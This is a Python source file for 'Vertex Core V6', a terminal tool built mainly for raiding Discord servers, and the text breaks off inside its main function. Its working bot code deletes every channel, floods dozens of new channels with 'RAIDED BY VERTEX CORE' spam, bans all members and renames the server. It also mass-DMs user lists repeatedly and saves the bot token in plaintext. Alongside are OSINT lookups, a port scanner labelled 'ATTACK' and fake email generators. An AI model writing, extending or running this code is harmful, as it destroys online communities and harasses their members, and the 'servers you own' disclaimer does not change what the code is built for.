#!/usr/bin/env python3
"""
VERTEX CORE V6 – PRODUCTION EDITION
Bootup binary animation + persistent last use + full Discord raid tools.
"""

import sys
import os
import json
import re
import socket
import ipaddress
import random
import string
import base64
import hashlib
import urllib.parse
import time
import asyncio
from datetime import datetime

# ---------- Bootup Animation ----------
def boot_animation(duration=3):
    """Show falling binary (1/0) matrix effect."""
    cols = os.get_terminal_size().columns
    lines = os.get_terminal_size().lines
    # Save original cursor
    sys.stdout.write("\033[?25l")  # Hide cursor
    sys.stdout.write("\033[2J\033[H")  # Clear screen
    # Create a list of columns with random positions
    columns = [0] * cols
    start_time = time.time()
    while time.time() - start_time < duration:
        for i in range(cols):
            if columns[i] == 0:
                # Random chance to start a new stream
                if random.random() < 0.02:
                    columns[i] = lines
            else:
                # Print binary digit at current row
                row = columns[i]
                digit = random.choice(['1', '0'])
                sys.stdout.write(f"\033[{row};{i+1}H{digit}")
                columns[i] -= 1
        sys.stdout.flush()
        time.sleep(0.05)
    # Clear screen and show cursor
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.write("\033[?25h")  # Show cursor
    sys.stdout.flush()

# Run boot animation before anything else
boot_animation(duration=2)  # 2 seconds of binary rain

# ---------- Colors ----------
PURPLE = '\033[95m'
DARK_PURPLE = '\033[35m'
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BOLD = '\033[1m'
RESET = '\033[0m'

LOGO = f"""
{PURPLE}    ██╗   ██╗███████╗██████╗ ████████╗███████╗██╗  ██╗     ██████╗ ██████╗ ██████╗ ███████╗
    ██║   ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝
    ██║   ██║█████╗  ██████╔╝   ██║   █████╗   ╚███╔╝     ██║     ██║   ██║██████╔╝█████╗  
    ╚██╗ ██╔╝██╔══╝  ██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██║     ██║   ██║██╔══██╗██╔══╝  
     ╚████╔╝ ███████╗██║  ██║   ██║   ███████╗██╔╝ ██╗    ╚██████╗╚██████╔╝██║  ██║███████╗
      ╚═══╝  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{RESET}
{DARK_PURPLE}                      
                              VERTEX CORE V6 - PRODUCTION{RESET}
{PURPLE}                          https://discord.gg/vertexcore (demo){RESET}
"""

CONFIG_FILE = "raid_config.json"
LAST_USE_FILE = "last_use.json"
DEFAULT_CONFIG = {
    "raid_message": "🔥 RAIDED BY VERTEX CORE 🔥\nThis server has been destroyed.\nJoin discord.gg/vertexcore for more.",
    "channel_name": "RAIDED-BY-VERTEX",
    "channel_count": 50,
    "spam_per_channel": 3,
    "server_name": "Hacked by Vertex Core",
    "delay_between_channels": 0.2,
    "delay_between_messages": 0.1,
    "mass_dm_delay": 1.0
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG.copy()

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def load_last_use():
    if os.path.exists(LAST_USE_FILE):
        with open(LAST_USE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_last_use(data):
    with open(LAST_USE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

RAID_CONFIG = load_config()
LAST_USE = load_last_use()

# Optional imports
try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
    PHONE_AVAILABLE = True
except ImportError:
    PHONE_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    import pyperclip
    CLIP_AVAILABLE = True
except ImportError:
    CLIP_AVAILABLE = False

# Helper functions
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def timestamp():
    return datetime.now().strftime("[%H:%M:%S]")

def print_frame(content, title="RESULT"):
    lines = content.split('\n')
    width = max(len(line) for line in lines) + 4
    print(f"{CYAN}+{'-' * (width-2)}+{RESET}")
    print(f"{CYAN}| {title.center(width-4)} |{RESET}")
    print(f"{CYAN}+{'-' * (width-2)}+{RESET}")
    for line in lines:
        print(f"{CYAN}| {line.ljust(width-4)} |{RESET}")
    print(f"{CYAN}+{'-' * (width-2)}+{RESET}")

def pause():
    input(f"{YELLOW}Press Enter to continue...{RESET}")

# ---------- Input helpers with persistence ----------
def get_simple_input(prompt, default=None, value_type=str, hint=""):
    if hint:
        display = f"{prompt} {hint}"
    else:
        display = prompt
    if default is not None:
        display += f" (default: {default})"
    user_input = input(f"{YELLOW}{display}: {RESET}").strip()
    if user_input == "" and default is not None:
        return default
    try:
        if value_type == int:
            return int(user_input)
        elif value_type == float:
            return float(user_input)
        else:
            return user_input
    except ValueError:
        print(f"{RED}Invalid input, using default.{RESET}")
        return default

def get_complex_input(prompt, hint="", allow_paste=True, last_value=None):
    if last_value:
        print(f"{CYAN}{prompt} {hint} (last used: {last_value[:4]}...{last_value[-4:] if len(last_value)>8 else last_value}){RESET}")
    else:
        print(f"{CYAN}{prompt} {hint}{RESET}")
    if not allow_paste or not CLIP_AVAILABLE:
        return input(f"{YELLOW}Enter manually: {RESET}").strip()
    print("1. Type manually")
    print("2. Paste from clipboard")
    choice = input(f"{YELLOW}Select [1-2]: {RESET}").strip()
    if choice == '2':
        value = pyperclip.paste().strip()
        if value:
            masked = value[:4] + "..." + value[-4:] if len(value) > 8 else value
            print(f"{GREEN}Pasted: {masked}{RESET}")
            confirm = input(f"{YELLOW}Correct? (y/n): {RESET}").lower()
            if confirm == 'y':
                return value
            else:
                return input("Enter manually: ").strip()
        else:
            print(f"{RED}Clipboard empty. Enter manually.{RESET}")
            return input("Enter manually: ").strip()
    else:
        return input("Enter manually: ").strip()

def get_token_guild_interactive():
    """Ask to use last saved token/guild, or get new ones."""
    global LAST_USE
    token = None
    guild_id = None
    if LAST_USE.get('token') and LAST_USE.get('guild_id'):
        print(f"{CYAN}Last used token: {LAST_USE['token'][:4]}...{LAST_USE['token'][-4:]}{RESET}")
        print(f"Last used guild ID: {LAST_USE['guild_id']}")
        use_last = get_simple_input("Use last saved settings? (y/n)", default='n', hint="")
        if use_last.lower() == 'y':
            token = LAST_USE['token']
            guild_id = LAST_USE['guild_id']
            print(f"{GREEN}Using saved token and guild ID.{RESET}")
    if token is None:
        token = get_complex_input("Discord bot token", hint="(paste or type)", allow_paste=True, last_value=LAST_USE.get('token'))
        guild_id = get_complex_input("Server ID", hint="(right-click to paste)", allow_paste=True, last_value=LAST_USE.get('guild_id'))
        # Save for next time
        LAST_USE['token'] = token
        LAST_USE['guild_id'] = guild_id
        save_last_use(LAST_USE)
    return token, guild_id

# ---------- OSINT & Utility functions ----------
def phone_lookup(phone_str):
    if not PHONE_AVAILABLE:
        return "Install phonenumbers"
    try:
        num = phonenumbers.parse(phone_str, None)
        if not phonenumbers.is_valid_number(num):
            return "Invalid phone number"
        return f"Number: {phonenumbers.format_number(num, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}\nCountry: {geocoder.description_for_number(num, 'en') or 'Unknown'}\nCarrier: {carrier.name_for_number(num, 'en') or 'Unknown'}\nTimezone: {', '.join(timezone.time_zones_for_number(num)) or 'Unknown'}"
    except Exception as e:
        return str(e)

def email_lookup(email):
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        return "Invalid email format"
    domain = email.split('@')[1]
    mx = []
    if DNS_AVAILABLE:
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            mx = [str(r.exchange) for r in answers]
        except:
            mx = ["No MX records"]
    else:
        mx = ["dnspython not installed"]
    return f"Email: {email}\nMX Servers: {', '.join(mx)}"

def ip_geolocation(ip):
    try:
        ipaddress.ip_address(ip)
    except:
        return "Invalid IP"
    if not REQUESTS_AVAILABLE:
        return "Install requests"
    try:
        url = f"http://ip-api.com/json/{ip}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                return f"IP: {ip}\nCountry: {data['country']}\nRegion: {data['regionName']}\nCity: {data['city']}\nISP: {data['isp']}\nOrg: {data['org']}"
            else:
                return f"Error: {data.get('message')}"
        else:
            return f"HTTP {r.status_code}"
    except Exception as e:
        return str(e)

def github_lookup(username):
    if not REQUESTS_AVAILABLE:
        return "Install requests"
    try:
        url = f"https://api.github.com/users/{username}"
        r = requests.get(url, timeout=10, headers={"User-Agent": "VertexCore"})
        if r.status_code == 404:
            return "User not found"
        if r.status_code != 200:
            return f"GitHub API error: {r.status_code}"
        data = r.json()
        return f"Name: {data.get('name', 'Not public')}\nRepos: {data.get('public_repos', 0)}\nFollowers: {data.get('followers', 0)}\nLocation: {data.get('location', 'Not public')}"
    except Exception as e:
        return str(e)

def port_scan(host):
    ports = [21,22,23,25,80,443,3389,8080]
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((host, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    if open_ports:
        return f"Open ports: {', '.join(map(str, open_ports))}"
    else:
        return "No open ports found or unreachable."

def web_headers(url):
    if not url.startswith("http"):
        url = "http://" + url
    if not REQUESTS_AVAILABLE:
        return "Install requests"
    try:
        r = requests.get(url, timeout=5, headers={"User-Agent": "VertexCore"})
        return f"Status: {r.status_code}\nServer: {r.headers.get('Server', 'Unknown')}\nContent-Type: {r.headers.get('Content-Type', 'Unknown')}"
    except Exception as e:
        return str(e)

def generate_password():
    return ''.join(random.choice(string.ascii_letters+string.digits+"!@#$%") for _ in range(12))

def generate_username():
    adj = ["Cool","Dark","Fast","Cyber","Neon","Shadow"]
    nouns = ["Hacker","Phantom","Void","Core","Vertex"]
    return random.choice(adj)+random.choice(nouns)+str(random.randint(10,99))

def generate_fake_email():
    domains = ["proton.me","tutanota.com","mail.com","temp-mail.org"]
    local = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return local + "@" + random.choice(domains)

def system_monitor():
    if not PSUTIL_AVAILABLE:
        return "Install psutil"
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    return f"CPU: {cpu}%\nRAM: {ram.percent}% ({ram.used//1024//1024}MB / {ram.total//1024//1024}MB)\nDisk: {disk.percent}% (Free: {disk.free//1024//1024}MB)"

def darkweb_validator(onion):
    if re.match(r'^[a-z2-7]{16,56}\.onion$', onion, re.IGNORECASE):
        return "Valid .onion format.\nNote: Reachability depends on Tor network."
    else:
        return "Invalid .onion address."

def about():
    return f"""Vertex Core V6 - Production Edition
Bootup binary animation, persistent last use.
Full paste support, mass DM repeat/delays.
Use responsibly – only on servers you own."""

# ---------- Discord Bot Control ----------
class DiscordNuker:
    def __init__(self, token, guild_id):
        self.token = token.strip()
        self.guild_id = int(guild_id)

    async def nuke(self, bot):
        guild = bot.get_guild(self.guild_id)
        if not guild:
            return "Guild not found"
        cfg = RAID_CONFIG
        for channel in guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.3)
            except:
                pass
        created = 0
        for i in range(cfg['channel_count']):
            try:
                new_channel = await guild.create_text_channel(f"{cfg['channel_name']}-{i+1}")
                for _ in range(cfg['spam_per_channel']):
                    await new_channel.send(cfg['raid_message'])
                    await asyncio.sleep(cfg['delay_between_messages'])
                created += 1
                await asyncio.sleep(cfg['delay_between_channels'])
            except:
                pass
        banned = 0
        for member in guild.members:
            if not member.bot and member != guild.me:
                try:
                    await member.ban(reason=cfg['raid_message'])
                    banned += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        try:
            await guild.edit(name=cfg['server_name'])
        except:
            pass
        return f"NUKE COMPLETE\nCreated {created} channels with {cfg['spam_per_channel']} spam each\nBanned {banned} members\nServer renamed to '{cfg['server_name']}'"

    async def spam_messages(self, bot, channel_id, message, count, delay):
        channel = bot.get_channel(int(channel_id))
        if not channel:
            return "Channel not found"
        for i in range(count):
            await channel.send(message)
            if delay > 0:
                await asyncio.sleep(delay)
        return f"Sent {count} spam messages"

    async def delete_all_channels(self, bot):
        guild = bot.get_guild(self.guild_id)
        if not guild:
            return "Guild not found"
        for channel in guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.3)
            except:
                pass
        return "All channels deleted"

    async def create_mass_channels(self, bot, base_name, count):
        guild = bot.get_guild(self.guild_id)
        if not guild:
            return "Guild not found"
        created = 0
        for i in range(count):
            try:
                await guild.create_text_channel(f"{base_name}-{i+1}")
                created += 1
                await asyncio.sleep(0.2)
            except:
                pass
        return f"Created {created} channels"

    async def rename_guild(self, bot, new_name):
        guild = bot.get_guild(self.guild_id)
        if guild:
            await guild.edit(name=new_name)
            return f"Guild renamed to {new_name}"
        return "Guild not found"

    async def mass_dm(self, bot, message, user_id):
        try:
            user = await bot.fetch_user(int(user_id))
            await user.send(message)
            return f"DM sent to {user.name} ({user_id})"
        except Exception as e:
            return f"Failed: {e}"

    async def mass_dm_from_file(self, bot, file_path, message, repeat, msg_delay, user_delay):
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        with open(file_path, 'r') as f:
            user_ids = [line.strip() for line in f if line.strip().isdigit()]
        if not user_ids:
            return "No valid user IDs found in file."
        sent_total = 0
        failed_total = 0
        for uid in user_ids:
            success = 0
            fail = 0
            for i in range(repeat):
                try:
                    user = await bot.fetch_user(int(uid))
                    await user.send(message)
                    success += 1
                    print(f"{GREEN}✓ DM {i+1}/{repeat} to {uid}{RESET}")
                    await asyncio.sleep(msg_delay)
                except Exception as e:
                    fail += 1
                    print(f"{RED}✗ Failed DM {i+1}/{repeat} to {uid}: {e}{RESET}")
            sent_total += success
            failed_total += fail
            await asyncio.sleep(user_delay)
        return f"Mass DM completed: {sent_total} sent, {failed_total} failed."

    async def ban_all(self, bot):
        guild = bot.get_guild(self.guild_id)
        if not guild:
            return "Guild not found"
        banned = 0
        for member in guild.members:
            if not member.bot and member != guild.me:
                try:
                    await member.ban(reason="Banned by Vertex Core")
                    banned += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        return f"Banned {banned} members"

def run_discord_action(token, guild_id, action, **kwargs):
    async def runner():
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        bot = commands.Bot(command_prefix="!", intents=intents)
        nuker = DiscordNuker(token, guild_id)
        result = None
        @bot.event
        async def on_ready():
            nonlocal result
            print(f"{GREEN}Logged in as {bot.user}{RESET}")
            if action == "nuke":
                result = await nuker.nuke(bot)
            elif action == "spam":
                result = await nuker.spam_messages(bot, kwargs['channel_id'], kwargs['message'], kwargs['count'], kwargs['delay'])
            elif action == "delete_channels":
                result = await nuker.delete_all_channels(bot)
            elif action == "create_channels":
                result = await nuker.create_mass_channels(bot, kwargs['base_name'], kwargs['count'])
            elif action == "rename_guild":
                result = await nuker.rename_guild(bot, kwargs['new_name'])
            elif action == "mass_dm":
                result = await nuker.mass_dm(bot, kwargs['message'], kwargs['user_id'])
            elif action == "mass_dm_file":
                result = await nuker.mass_dm_from_file(bot, kwargs['file_path'], kwargs['message'], kwargs['repeat'], kwargs['msg_delay'], kwargs['user_delay'])
            elif action == "ban_all":
                result = await nuker.ban_all(bot)
            await bot.close()
        try:
            await bot.start(token)
        except discord.LoginFailure:
            result = "Invalid token. Check your bot token."
        except discord.PrivilegedIntentsRequired:
            result = "Privileged intents required. Enable them in Discord Developer Portal."
        except Exception as e:
            result = f"Error: {e}"
        return result
    return asyncio.run(runner())

def edit_config_menu():
    global RAID_CONFIG
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}EDIT RAID CONFIGURATION{RESET}\n")
    print(f"{CYAN}Current values:{RESET}")
    for k, v in RAID_CONFIG.items():
        print(f"  {k}: {v}")
    print(f"\n{YELLOW}Enter new values (leave blank to keep current):{RESET}")
    new_config = RAID_CONFIG.copy()
    new_config['raid_message'] = get_simple_input("Raid message", default=RAID_CONFIG['raid_message'], hint="(text)")
    new_config['channel_name'] = get_simple_input("Channel name", default=RAID_CONFIG['channel_name'], hint="(text)")
    new_config['channel_count'] = get_simple_input("Number of channels", default=RAID_CONFIG['channel_count'], value_type=int, hint="(e.g., 50)")
    new_config['spam_per_channel'] = get_simple_input("Spam messages per channel", default=RAID_CONFIG['spam_per_channel'], value_type=int, hint="(e.g., 3)")
    new_config['server_name'] = get_simple_input("Server name after raid", default=RAID_CONFIG['server_name'], hint="(text)")
    new_config['delay_between_channels'] = get_simple_input("Delay between channel creation (seconds)", default=RAID_CONFIG['delay_between_channels'], value_type=float, hint="(e.g., 0.2)")
    new_config['delay_between_messages'] = get_simple_input("Delay between spam messages (seconds)", default=RAID_CONFIG['delay_between_messages'], value_type=float, hint="(e.g., 0.1)")
    new_config['mass_dm_delay'] = get_simple_input("Delay between users (seconds)", default=RAID_CONFIG.get('mass_dm_delay',1.0), value_type=float, hint="(e.g., 1.0)")
    save_config(new_config)
    RAID_CONFIG = new_config
    print(f"{GREEN}Configuration saved.{RESET}")
    pause()

def discord_menu():
    if not DISCORD_AVAILABLE:
        print(f"{RED}Install discord.py: pip install discord.py{RESET}")
        pause()
        return
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}DISCORD RAID TOOLS{RESET}")
    print(f"{RED}{BOLD}⚠️  DESTRUCTIVE ACTIONS – USE ONLY ON SERVERS YOU OWN ⚠️{RESET}\n")
    print(f"{CYAN}1.  Full Nuke (use current config)")
    print("2.  Spam messages in a channel")
    print("3.  Delete all channels")
    print("4.  Create mass channels")
    print("5.  Rename server")
    print("6.  Single DM (by user ID)")
    print("7.  Mass DM (paste IDs or file)")
    print("8.  Ban all members")
    print("9.  Edit raid config (in‑system)")
    print("10. Back to main menu{RESET}")
    choice = get_simple_input("Select", default=10, value_type=int, hint="[1-10]")
    if choice == 10:
        return
    if choice == 9:
        edit_config_menu()
        return
    # Get token and guild ID with persistence
    token, guild_id = get_token_guild_interactive()
    if not token or not guild_id:
        print(f"{RED}Token or guild ID missing.{RESET}")
        pause()
        return
    # Execute actions
    if choice == 1:
        confirm = get_simple_input("Type 'NUKE' to confirm", default="", hint="(case sensitive)")
        if confirm == "NUKE":
            print(f"{YELLOW}Executing nuke...{RESET}")
            res = run_discord_action(token, guild_id, "nuke")
            print(f"{GREEN}{res}{RESET}")
        else:
            print("Cancelled.")
    elif choice == 2:
        cid = get_complex_input("Channel ID", hint="(paste)", allow_paste=True, last_value=LAST_USE.get('last_channel_id'))
        if cid:
            LAST_USE['last_channel_id'] = cid
            save_last_use(LAST_USE)
        msg = get_simple_input("Message to spam", hint="(text)")
        count = get_simple_input("Number of messages", default=1, value_type=int, hint="(e.g., 10)")
        delay = get_simple_input("Delay between messages (seconds)", default=0.5, value_type=float, hint="(0 for burst)")
        res = run_discord_action(token, guild_id, "spam", channel_id=cid, message=msg, count=count, delay=delay)
        print(f"{GREEN}{res}{RESET}")
    elif choice == 3:
        if get_simple_input("Delete all channels? Type 'YES'", default="", hint="(case sensitive)") == "YES":
            res = run_discord_action(token, guild_id, "delete_channels")
            print(f"{GREEN}{res}{RESET}")
        else:
            print("Cancelled.")
    elif choice == 4:
        name = get_simple_input("Base channel name", hint="(text)")
        count = get_simple_input("How many channels", default=10, value_type=int, hint="(e.g., 20)")
        res = run_discord_action(token, guild_id, "create_channels", base_name=name, count=count)
        print(f"{GREEN}{res}{RESET}")
    elif choice == 5:
        new = get_simple_input("New server name", hint="(text)")
        res = run_discord_action(token, guild_id, "rename_guild", new_name=new)
        print(f"{GREEN}{res}{RESET}")
    elif choice == 6:
        uid = get_complex_input("Discord User ID", hint="(paste)", allow_paste=True, last_value=LAST_USE.get('last_user_id'))
        if uid and uid.isdigit():
            LAST_USE['last_user_id'] = uid
            save_last_use(LAST_USE)
        if not uid.isdigit():
            print(f"{RED}Invalid user ID.{RESET}")
            pause()
            return
        msg = get_simple_input("Message to send", hint="(text)")
        res = run_discord_action(token, guild_id, "mass_dm", user_id=uid, message=msg)
        print(f"{GREEN}{res}{RESET}")
    elif choice == 7:
        print(f"{CYAN}How to provide user IDs?{RESET}")
        print("1. Paste from clipboard (comma/space/newline separated)")
        print("2. Read from file (one ID per line)")
        sub = get_simple_input("Select", default=1, value_type=int, hint="[1-2]")
        user_ids = []
        if sub == 1:
            if not CLIP_AVAILABLE:
                print(f"{RED}pyperclip not installed. Install with: pip install pyperclip{RESET}")
                pause()
                return
            raw = pyperclip.paste().strip()
            if not raw:
                print(f"{RED}Clipboard empty.{RESET}")
                pause()
                return
            user_ids = re.split(r'[,\s\n]+', raw)
            user_ids = [uid.strip() for uid in user_ids if uid.strip().isdigit()]
            if not user_ids:
                print(f"{RED}No valid numeric user IDs found in clipboard.{RESET}")
                pause()
                return
            print(f"{GREEN}Found {len(user_ids)} user IDs from clipboard.{RESET}")
        else:
            filename = get_simple_input("Filename", hint="(in current folder, e.g., users.txt)")
            if not os.path.exists(filename):
                print(f"{RED}File not found: {filename}{RESET}")
                pause()
                return
            with open(filename, 'r') as f:
                user_ids = [line.strip() for line in f if line.strip().isdigit()]
            if not user_ids:
                print(f"{RED}No valid user IDs found in file.{RESET}")
                pause()
                return
            print(f"{GREEN}Loaded {len(user_ids)} user IDs from file.{RESET}")
        # Ask for repeat count and delays
        msg = get_simple_input("Message to send to each user", hint="(text)")
        repeat = get_simple_input("How many times to send to each user", default=1, value_type=int, hint="(e.g., 3)")
        msg_delay = get_simple_input("Delay between messages to same user (seconds)", default=0.5, value_type=float, hint="(e.g., 0.5)")
        user_delay = get_simple_input("Delay between different users (seconds)", default=RAID_CONFIG.get('mass_dm_delay', 1.0), value_type=float, hint="(e.g., 1.0)")
        # Write to temp file and use mass_dm_from_file
        temp_file = "temp_user_ids.txt"
        with open(temp_file, 'w') as f:
            f.write('\n'.join(user_ids))
        print(f"{YELLOW}Sending DMs... (repeat {repeat}, msg delay {msg_delay}s, user delay {user_delay}s){RESET}")
        res = run_discord_action(token, guild_id, "mass_dm_file", file_path=temp_file, message=msg, repeat=repeat, msg_delay=msg_delay, user_delay=user_delay)
        os.remove(temp_file)
        print(f"{GREEN}{res}{RESET}")
    elif choice == 8:
        if get_simple_input("Ban all members? Type 'BAN'", default="", hint="(case sensitive)") == "BAN":
            res = run_discord_action(token, guild_id, "ban_all")
            print(f"{GREEN}{res}{RESET}")
        else:
            print("Cancelled.")
    else:
        print(f"{RED}Invalid choice.{RESET}")
    pause()

# ---------- Other menus (unchanged but using helpers) ----------
def osint_menu():
    while True:
        clear()
        print(LOGO)
        print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
        print(f"{YELLOW}{timestamp()}{RESET}\n")
        print(f"{BOLD}{PURPLE}OSINT TOOLS{RESET}\n")
        print(f"{CYAN}1. Phone Lookup")
        print("2. Email MX Lookup")
        print("3. IP Geolocation")
        print("4. Back to main menu{RESET}")
        choice = get_simple_input("Select", default=4, value_type=int, hint="[1-4]")
        if choice == 1:
            num = get_complex_input("Phone number", hint="(e.g., +1234567890)", allow_paste=True, last_value=None)
            res = phone_lookup(num)
            print_frame(res, "Phone Lookup")
            pause()
        elif choice == 2:
            email = get_complex_input("Email address", hint="(e.g., user@example.com)", allow_paste=True, last_value=None)
            res = email_lookup(email)
            print_frame(res, "Email MX Lookup")
            pause()
        elif choice == 3:
            ip = get_complex_input("IP address", hint="(e.g., 8.8.8.8)", allow_paste=True, last_value=None)
            res = ip_geolocation(ip)
            print_frame(res, "IP Geolocation")
            pause()
        elif choice == 4:
            break
        else:
            print(f"{RED}Invalid{RESET}")
            pause()

def github_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}GITHUB LOOKUP{RESET}\n")
    user = get_complex_input("GitHub username", hint="(e.g., octocat)", allow_paste=True, last_value=None)
    res = github_lookup(user)
    print_frame(res, "GitHub Profile")
    pause()

def attack_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}PORT SCANNER (ATTACK){RESET}\n")
    target = get_complex_input("Target IP/hostname", hint="(e.g., 192.168.1.1)", allow_paste=True, last_value=None)
    res = port_scan(target)
    print_frame(res, "Port Scan Results")
    pause()

def ipweb_menu():
    while True:
        clear()
        print(LOGO)
        print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
        print(f"{YELLOW}{timestamp()}{RESET}\n")
        print(f"{BOLD}{PURPLE}IP / WEB TOOLS{RESET}\n")
        print(f"{CYAN}1. IP Geolocation")
        print("2. Website Headers")
        print("3. Back to main menu{RESET}")
        choice = get_simple_input("Select", default=3, value_type=int, hint="[1-3]")
        if choice == 1:
            ip = get_complex_input("IP address", hint="(e.g., 8.8.8.8)", allow_paste=True, last_value=None)
            res = ip_geolocation(ip)
            print_frame(res, "IP Geolocation")
            pause()
        elif choice == 2:
            url = get_complex_input("URL", hint="(e.g., example.com)", allow_paste=True, last_value=None)
            res = web_headers(url)
            print_frame(res, "Website Headers")
            pause()
        elif choice == 3:
            break
        else:
            print(f"{RED}Invalid{RESET}")
            pause()

def gen_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}GENERATORS{RESET}\n")
    print(f"{CYAN}1. Random Password")
    print("2. Random Username")
    print("3. Fake Email")
    print("4. Back to main menu{RESET}")
    choice = get_simple_input("Select", default=4, value_type=int, hint="[1-4]")
    if choice == 1:
        print_frame(f"Password: {generate_password()}", "Random Password")
    elif choice == 2:
        print_frame(f"Username: {generate_username()}", "Random Username")
    elif choice == 3:
        print_frame(f"Fake Email: {generate_fake_email()}", "Fake Email")
    elif choice == 4:
        return
    else:
        print(f"{RED}Invalid{RESET}")
    pause()

def utils_menu():
    while True:
        clear()
        print(LOGO)
        print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
        print(f"{YELLOW}{timestamp()}{RESET}\n")
        print(f"{BOLD}{PURPLE}UTILITIES{RESET}\n")
        print(f"{CYAN}1. Base64 Encode")
        print("2. Base64 Decode")
        print("3. MD5 Hash")
        print("4. SHA256 Hash")
        print("5. URL Encode")
        print("6. URL Decode")
        print("7. Back to main menu{RESET}")
        choice = get_simple_input("Select", default=7, value_type=int, hint="[1-7]")
        if choice == 1:
            s = get_simple_input("String to encode", hint="(text)")
            enc = base64.b64encode(s.encode()).decode()
            print_frame(enc, "Base64 Encode")
        elif choice == 2:
            s = get_simple_input("Base64 string", hint="(e.g., SGVsbG8=)")
            try:
                dec = base64.b64decode(s).decode()
                print_frame(dec, "Base64 Decode")
            except:
                print_frame("Invalid Base64", "Error")
        elif choice == 3:
            s = get_simple_input("String", hint="(text)")
            print_frame(hashlib.md5(s.encode()).hexdigest(), "MD5 Hash")
        elif choice == 4:
            s = get_simple_input("String", hint="(text)")
            print_frame(hashlib.sha256(s.encode()).hexdigest(), "SHA256 Hash")
        elif choice == 5:
            s = get_simple_input("String", hint="(text)")
            print_frame(urllib.parse.quote(s), "URL Encode")
        elif choice == 6:
            s = get_simple_input("Encoded string", hint="(e.g., Hello%20World)")
            print_frame(urllib.parse.unquote(s), "URL Decode")
        elif choice == 7:
            break
        else:
            print(f"{RED}Invalid{RESET}")
        pause()

def darkweb_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print(f"{BOLD}{PURPLE}DARKWEB .ONION VALIDATOR{RESET}\n")
    onion = get_complex_input("Enter .onion address", hint="(e.g., facebookcorewwwi.onion)", allow_paste=True, last_value=None)
    res = darkweb_validator(onion)
    print_frame(res, "Validation Result")
    pause()

def about_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    print_frame(about(), "About Vertex Core V6")
    pause()

def monitor_menu():
    clear()
    print(LOGO)
    print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
    print(f"{YELLOW}{timestamp()}{RESET}\n")
    res = system_monitor()
    print_frame(res, "System Monitor")
    pause()

def show_main_menu():
    print(f"{BOLD}{PURPLE}CATEGORIES{RESET}")
    left = ["1. OSINT", "2. GitHub", "3. Discord (RAID)", "4. ATTACK (Port)", "5. IP/WEB", "6. GEN"]
    right = ["7. UTILS", "8. DARKWEB", "9. ABOUT", "10. MONITOR", "11. Quit"]
    max_len = max(len(l) for l in left)
    for i in range(len(left)):
        right_item = right[i] if i < len(right) else ""
        print(f"{CYAN}{left[i]:<{max_len+2}} {right_item}{RESET}")
    print(f"\n{PURPLE}ROOT_ID: OK{RESET}")

def main():
    while True:
        clear()
        print(LOGO)
